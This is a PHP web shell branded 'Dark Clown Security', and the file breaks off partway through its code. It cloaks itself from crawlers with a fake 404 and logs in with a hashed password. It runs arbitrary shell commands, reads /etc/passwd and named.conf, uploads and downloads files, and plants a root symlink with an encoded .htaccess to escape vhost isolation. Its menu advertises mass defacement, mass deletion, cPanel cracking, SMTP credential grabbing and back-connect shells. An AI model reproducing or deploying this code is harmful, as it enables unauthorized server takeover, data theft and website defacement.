<?php
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "af2950f5c700f60a4ed56354a4c36f29"; 
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<?php
if($_GET['ARYA'] == 'LOGIN')
{
echo '
<html>
<head>
<title>Dark Clown Security</title>
<center>
<body bgcolor=black>
<script type="text/javascript" src="http://htmlfreecodes.com/codes/rain.js"></script> 
<center><br><br><style type="text/css">
.kedip {
-webkit-animation-name: blinker;
-webkit-animation-duration: 3s;
-webkit-animation-timing-function: linear;
-webkit-animation-iteration-count: infinite;
 
-moz-animation-name: blinker;
-moz-animation-duration: 2s;
-moz-animation-timing-function: linear;
-moz-animation-iteration-count: infinite;
 
 animation-name: blinker;
 animation-duration: 1s;
 animation-timing-function: linear;
 animation-iteration-count: infinite;
 
 color: #1b42d1;
}
 
@-moz-keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }
 
@-webkit-keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }
 
@keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }
</style><center><pre onkeydown="return false;" onmousedown="return false;" class="kedip">
<font size="8" style="color:red;font-family:Iceberg;">[=--> Dark Clown Security <--=]</font></center>
<center><br><br><img src=https://i.ibb.co/0jxBLHw/Screenshot-2020-08-03-15-15-30-97.png width=800px height=500px></center>
<br>
<center><font size=6 color=lime face=monospace>Fvcking in my shell heheh :) </font>
<br><br>
<form method=post><input type=password name=pass placeholder=ketik password style="margin-top:14px;width:200px;background: url(https://i.pinimg.com/originals/71/dd/00/71dd009941483e190e7c1d90867268ff.jpg);color:gold;border:4px solid red"/>   </font></body></head></html>
<font color=black>h<input type=submit value=masuk style="margin-top:6px;width:60px;background: url(https://i.pinimg.com/originals/71/dd/00/71dd009941483e190e7c1d90867268ff.jpg);color:#00FFFF;border:4px solid red"/></form>
<br/><br/>
<table border=1 width="50%" bordercolor="darkgrey"><td width="100%"><center><pre onkeydown="return false;" onmousedown="return false;" class="kedip"><font color=white>--=| <font style="color:red;font-family:Iceberg;"><marquee scrollamount=10 behavior=alternate width=80%>>> ^<font color=dakkhi>Dark Clown Security</font></h1></font>^ <<</marquee><font color=white> |=--</font></font></font></center></td><br><br><center><font color=lime>Powered by @<a href="https://instagram.com/dark_clown_sec"><font color=red>Dark Clo<font color=white>wn Security<br></font></a></div></center>';
}else{
echo "<font size=6><p align=left>Not Found</font><br><br>
<font size=4>The requested URL was not found on this server.<br><br>
Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.";
}
?>

<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>

<html>
<head>
<script language="JavaScript"> function tb5_makeArray(n){ this.length = n; return this.length; } tb5_messages = new tb5_makeArray(7); tb5_messages[0] = ""; tb5_messages[1] = ""; tb5_messages[2] = ""; tb5_messages[3] = "Dark Clown Security"; tb5_messages[4] = "Kita Dark Clown Security"; tb5_messages[5] = "Hanya Ingin Bersenang Senang"; tb5_messages[6] = "Happy Defaceing hahaha :) "; tb5_rptType = 'infinite'; tb5_rptNbr = 20; tb5_speed = 30; tb5_delay = 2000; var tb5_counter=2; var tb5_currMsg=0; var tb5_stsmsg=""; function tb5_shuffle(arr){ var k; for (i=0; i<arr.length; i++){ k = Math.round(Math.random() * (arr.length - i - 1)) + i; temp = arr[i];arr[i]=arr[k];arr[k]=temp; } return arr; } tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length); tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length); for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_"; } tb5_arr = tb5_shuffle(tb5_arr); function tb5_init(n){ var k; if (n == tb5_arr.length){ if (tb5_currMsg == tb5_messages.length-1){ if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){ clearTimeout(tb5_timerID); return; } tb5_counter++; tb5_currMsg=0; } else{ tb5_currMsg++; } n=0; tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length); tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length); for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_"; } tb5_arr = tb5_shuffle(tb5_arr); tb5_sp=tb5_delay; } else{ tb5_sp=tb5_speed; k = tb5_arr[n]; tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k); tb5_stsmsg = ""; for (var i=0; i<tb5_sts.length; i++) tb5_stsmsg += tb5_sts[i]; document.title = tb5_stsmsg; n++; } tb5_timerID = setTimeout("tb5_init("+n+")", tb5_sp); } function tb5_randomizetitle(){ tb5_init(0); } tb5_randomizetitle(); </script>

<title>Dark Clown Security</title>
<meta name='author' content='MR-X666X-AND-Mr.TenAr'>
<meta charset="UTF-8">
<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
<link href="http://bootswatch.com/flatly/bootstrap.min.css" rel="stylesheet">
        <script ></script>
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
body{
	background: url(https://scontent.fcgk18-1.fna.fbcdn.net/v/t1.0-9/116792575_666958967503661_9030972627880797844_o.jpg?_nc_cat=105&_nc_sid=cdbe9c&_nc_eui2=AeGoUvYXZXQhLRuw5oZFJurIh8ue8qmOe52Hy57yqY57nQJyI2pMNrGHhQvvd8e4UYB1vffypkgH7_BSKex4rVMI&_nc_ohc=z9wJW0JI1s8AX8VYMoC&_nc_ht=scontent.fcgk18-1.fna&oh=95f0b71a5a6fce17d72752cf831a3503&oe=5F4E8276) no-repeat center center fixed; #fff;
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
    background-attachment:fixed;
	color:white;
	font-size:13px;
	font-family: "Lato","Helvetica Neue",Helvetica,Arial,sans-serif;
}
h1{
	color:#ffffff;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
	padding: 5px;
}
.table_home, .td_home {
	border: 1px solid  #00FF00;
}
.td_home:hover {
	background:grey;
}
.th_home{
	padding: 5px;
	border: 3px solid  #00FF00;
	background:transparent;
}
th {
	padding: 15px;
}
a {
	color:  #ffffff;
}

input[type=text], input[type=password]{
	background: transparent; 
	color: white; 
	border: 1px solid #00FF00; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
input[type=submit]{
	color: #8B0000; 
	border: 1px solid  #800000; 
	margin: 5px;
	padding: 3px 15px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid   #00FF00;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #00FF00;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color:  #00FF00; 
	border: 1px solid #8B0000; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
option:hover {
	background:  #00FF00;
	color: #000000;
}
</style>
</head>
<?php
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=#18BC9C>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=#18BC9C>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}
function bing($dork) {
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
	    if($x) {
			preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
			foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
			$npage = $npage + 10;
			if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
		} else break;
	}
	$URLs = array();
	foreach($allLinks as $url){
	    $exp = explode("/", $url);
	    $URLs[] = $exp[2];
	}
	$array = array_filter($URLs);
	$array = array_unique($array);
 	$sss = count(array_unique($array));
	foreach($array as $domain) {
		echo $domain."\n";
	}
}
function reverse($url) {
	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
		  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
		  curl_setopt($ch, CURLOPT_HEADER, 0);
		  curl_setopt($ch, CURLOPT_POST, 1);
	$resp = curl_exec($ch);
	$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
	$array = explode(",,", $resp);
	unset($array[0]);
	foreach($array as $lnk) {
		$lnk = "http://$lnk";
		$lnk = str_replace(",", "", $lnk);
		echo $lnk."\n";
		ob_flush();
		flush();
	}
		curl_close($ch);
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
	$_COOKIE = idx_ss($_COOKIE);
}

if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$kernel = php_uname();
$admin_id=$_SERVER['SERVER_ADMIN'];
$software = getenv("SERVER_SOFTWARE");
$d0mains = @file("/etc/named.conf");
            $users=@file('/etc/passwd');
        if($d0mains)
        { 
            $count;  
            foreach($d0mains as $d0main)
            {
                if(@ereg("zone",$d0main))
                {
                    preg_match_all('#zone "(.*)"#', $d0main, $domains);
                    flush();
                    if(strlen(trim($domains[1][0])) > 2)
                    {
                        flush();
                        $count++;
                    } 
                }
            }
        }
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=#48D1CC>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=#48D1CC>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=#48D1CC>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=#48D1CC>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=#48D1CC>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=#48D1CC>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=#48D1CC>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "<style type=text/css>
.kedip {
-webkit-animation-name: blinker;
-webkit-animation-duration: 3s;
-webkit-animation-timing-function: linear;
-webkit-animation-iteration-count: infinite;
 
-moz-animation-name: blinker;
-moz-animation-duration: 2s;
-moz-animation-timing-function: linear;
-moz-animation-iteration-count: infinite;
 
 animation-name: blinker;
 animation-duration: 1s;
 animation-timing-function: linear;
 animation-iteration-count: infinite;
 
 color: #1b42d1;
}
 
@-moz-keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }
 
@-webkit-keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }
 
@keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }
</style>
<center><pre onkeydown=return false; onmousedown=return false; class=kedip><font size=12 style=color:#E6E6FA font-family:Iceberg>&#9760; ᗪ卂尺Ҝ 匚ㄥㄖ山几 丂乇匚ㄩ尺丨ㄒㄚ &#9760;</font></center>";
echo "<center> System: <font color=#48D1CC>".$kernel."</font><br>";
echo "User: <font color=#48D1CC>".$user."</font> (".$uid.") Group: <font color=#48D1CC>".$group."</font> (".$gid.")<br>";
echo "Admin : <font color=#48D1CC>".$admin_id."</font> | Websites: <font color=#48D1CC>$count</font>  Domains<br>";
echo "Host: <font color=#48D1CC>".$_SERVER['SERVER_NAME']."</font><br>";
echo "Safe Mode: ".$sm."<br>";
echo "Magic_quotes_gpc: ".$magico."<br>";
echo "Server IP: <font color=#48D1CC>".$ip."</font> | Your IP: <font color=#48D1CC>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=#48D1CC>$used</font> / <font color=#48D1CC>$total</font> ( Free: <font color=#48D1CC>$freespace</font> )<br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl </center><br><marquee>&#9884 Dark Clown Security &#9884</font></a></marquee>";
if (isset($_GET['about'])) {
echo "<br><br><hr><center><img src='https://i.ibb.co/0jxBLHw/Screenshot-2020-08-03-15-15-30-97.png' height=200px width=300px></center><center><font color=white size=4>Terimakasih yang sudah mensupport saya teruntuk untuk team ini saya bangga :) <br>
Tanpa kalian kita tidak akan BESAR seperti sekarang ..<br>
Greetz :<br>All Member <u>Dark Clown Security</u><br>special thanks to :<br>[Mr.VR1X-TEAM]<br>[Dark Clown Security]<br>Support kami >><a href='http://darkclownsecurity.org' target='_blank'><font color='#18BC9C'>klik here!</font></a><<<br><br><br>Contac me : darkclownsecurity@hacker.com</center></font>";
}
echo "<hr>";
echo "<center>";
echo "<ul>";
echo "<font color=red>&#9760;<a style=margin:3px; 	class='btn btn-success btn-sm' href='?'>Home</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px; 	class='btn btn-success btn-sm' href='?dir=$dir&do=upload'>Upload</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px; 	class='btn btn-success btn-sm' href='?dir=$dir&do=csrf'>Csrf Online</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px; class='btn btn-success btn-sm' href='?dir=$dir&do=sym404'>Sym 404</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px; class='btn btn-success btn-sm' href='?dir=$dir&do=symlink'>Symlink</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px; class='btn btn-success btn-sm' href='?dir=$dir&do=sympy'>Symlink Python</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px; class='btn btn-success btn-sm' href='?dir=$dir&do=hashid'>Hash Identification</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px; class='btn btn-success btn-sm' href='?dir=$dir&do=hashgen'>Hash Generator</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px; 	class='btn btn-success btn-sm' href='#com'>Command</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=mass_deface'>Mass Deface</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=mass_delete'>Mass Delete</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&bypass=vhosts'>Bypass Vhost</a></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&bypass=etcpass'>Bypass /etc/passwd</a></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=config'>Config</a><font color=red></font></li>";
echo "<br>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&bypass=cloudfl'>Bypass CloudFlare</a></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=jumping'>Jumping</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&bypass=disablefunc'>Disable Functions</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=cpanel'>CPanel Crack</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=network'>Network</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=smtp'>SMTP Grabber</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=cgi'>CGI Telnet</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=bctools'>Back Connect</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=adminer'>Adminer</a><font color=red></font></li>";
echo "<br>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=fake_root'>Fake Root</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=cpftp_auto'>CPanel/FTP Auto Deface</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' style='color: red;' href='?about=true'>About</a><font color=red></font></li>";
echo "<font color=red>&#9760;<a style=margin:3px;	class='btn btn-success btn-sm' style='color: red;' href='?logout=true'>Logout</a><font color=red></font></li></font></font>";
echo "</ul>";
echo "</center>";
echo "<hr>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo "$scdir[$i]";
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ] <br>";
if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
} elseif($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<script type='text/javascript'>swal('Berhasil Di Upload', '$dir/".$_FILES['ix_file']['name']."' , 'success')</script>";
			} else {
				$act = "<script type='text/javascript'>swal('Gagal Upload File', 'Sad :')' , 'error')</script>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=#48D1CC>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<script type='text/javascript'>swal('Gagal Upload File', 'Sad :')' , 'error')</script>";
				}
			} else {
				$act = "<script type='text/javascript'>swal('Gagal Upload File', 'Sad :')' , 'error')</script>";;
			}
		}
	}
	echo "<h1> Upload File </h1>:
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")."<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload' class='btn btn-success btn-sm'>
	</form>";
	echo $act;
	echo "</center>";
	} 
elseif($_GET['bypass'] == 'cloudfl') {
echo '<form method="post">
<center>
<h3>Bypass CloudFlare</h3>
<select class="inputz" name="krz">
<option>ftp</option>
<option>direct-connect</option>
<option>webmail</option>
<option>cpanel</option>
</select>
<input class="inputz" type="text" name="target" value="url">
<input class="inputzbut" type="submit" value="Bypass!"></center>';
$target = $_POST['target'];
    # Bypass From FTP
    if ($_POST['krz'] == "ftp") {
        $ftp = gethostbyname("ftp." . "$target");
        echo "<script type='text/javascript'>swal('CloudFlare FTP Berhasil Di Bypass', 'Silahkan Cek Result' , 'success')</script>";
        echo "<br><p align='center' dir='ltr'>
        <font color='white'>CORRECT IP IS: </font>
        <font color='lime'>$ftp</font></p>";
    }
    # Bypass From Direct-Connect
    if ($_POST['krz'] == "direct-connect") {
    	echo "<script type='text/javascript'>swal('CloudFlare direct-connect Berhasil Di Bypass', 'Silahkan Cek Result' , 'success')</script>";
        $direct = gethostbyname("direct-connect." . "$target");
        echo "<br><p align='center' dir='ltr'>
        <font color='white'>CORRECT IP IS: </font>
        <font color='lime'>$direct</font></p>";
    }
    # Bypass From Webmail
    if ($_POST['krz'] == "webmail") {
    	echo "<script type='text/javascript'>swal('CloudFlare webmail Berhasil Di Bypass', 'Silahkan Cek Result' , 'success')</script>";
        $web = gethostbyname("webmail." . "$target");
        echo "<br><p align='center' dir='ltr'>
        <font color='white'>CORRECT IP IS: </font>
        <font color='lime'>$web</font></p>";
    }
    # Bypass From Cpanel
    if ($_POST['krz'] == "cpanel") {
    	echo "<script type='text/javascript'>swal('CloudFlare cpanel Berhasil Di Bypass', 'Silahkan Cek Result' , 'success')</script>";
        $cpanel = gethostbyname("cpanel." . "$target");
        echo "<br><p align='center' dir='ltr'>
        <font color='white'>CORRECT IP IS: </font>
        <font color='lime'>$cpanel</font></p>";
    }
}
elseif($_GET['bypass'] == 'vhosts'){
	echo "<script type='text/javascript'>swal('CloudFlare vhosts Berhasil Di Bypass', 'Silahkan Cek Result' , 'success')</script>";
	echo "<form method='post' action=''>";
	echo "<center><h3>Bypass Symlink vHost</h3>";
	echo "<input type='submit' value='Bypass!' name='jembut'>";
		if (isset($_POST['jembut'])){
			echo "<script type='text/javascript'>swal('Yes Berhasil Di Bypass', 'silahkan cek' , 'success')</script>";
                        mkdir('symvhosts', 0755);
                        chdir('symvhosts');
                        system('ln -s / kuda.txt');
			$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBrdWRhLmh0bWwNCkFkZFR5cGUgdHh0IC5waHANCkFkZEhhbmRsZXIgdHh0IC5waHA=';
			$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","kuda.txt");
			$rt="<a href='symvhosts/kuda.txt' target='_blank'><font color='lime'>Bypassed Successfully!</font></a>";
	echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br><br>$rt<br>Note: Kalo Forbidden pas ngebuka /var/www/vhosts/domain.com/ harap tambahkan httpdocs ex:/var/www/vhosts/domain.com/httpdocs/</center>";} echo "</form>";
	}
elseif($_GET['do'] == 'sympy') {
	$sym_dir = mkdir('dcs_sympy', 0755);
    chdir('dcs_sympy');
	$file_sym = "sym.py";
